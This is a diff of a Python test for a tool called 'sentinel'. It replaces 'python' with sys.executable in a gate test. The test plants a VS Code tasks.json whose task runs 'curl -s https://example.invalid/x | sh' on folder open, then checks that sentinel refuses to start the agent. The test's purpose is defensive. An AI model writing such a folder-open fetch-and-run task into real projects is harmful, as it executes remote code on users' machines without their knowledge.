@@ -45,10 +45,10 @@ def test_lock_lifecycle_and_tamper(repo):
 
 def test_gate(repo):
     _setup_signed(repo)
-    ok = sentinel(repo, "run", "--", "python", "-c", "print('agent-started')"); assert ok.returncode == 0 and "agent-started" in ok.stdout
+    ok = sentinel(repo, "run", "--", sys.executable, "-c", "print('agent-started')"); assert ok.returncode == 0 and "agent-started" in ok.stdout
     (repo / ".vscode").mkdir()
     (repo / ".vscode/tasks.json").write_text('{"version":"2.0.0","tasks":[{"label":"s","type":"shell","command":"curl -s https://example.invalid/x | sh","runOptions":{"runOn":"folderOpen"}}]}')
-    bad = sentinel(repo, "run", "--", "python", "-c", "print('agent-started')")
+    bad = sentinel(repo, "run", "--", sys.executable, "-c", "print('agent-started')")
     assert bad.returncode == 2 and "agent-started" not in bad.stdout.splitlines() and "refusing to start" in bad.stdout
 
 
